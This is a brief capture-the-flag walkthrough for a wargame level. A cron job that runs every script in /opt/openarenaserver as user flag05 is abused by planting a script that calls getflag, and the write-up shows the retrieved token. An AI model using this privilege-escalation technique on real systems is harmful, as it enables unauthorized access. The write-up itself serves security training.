When logged on as `level05` we have a prompt telling us we have mail. We check `/var/mail` and find a file `level05`:
```
$> cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
This is a cron instruction to launch the script `openarenaserver` as `flag05` every two minutes.

We check the script:
```
$> cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

It will run all the scripts in the `/opt/openarenaserver` folder, and delete them afterwards.  
To use this to our advantage, we write the following script in `/opt/openarenaserver`: `getflag >/tmp/flag`.  
We wait for the crontab to run (the script will be deleted), and then `cat /tmp/flag`: `Check flag.Here is your token : viuaaale9huek52boumoomiocv`
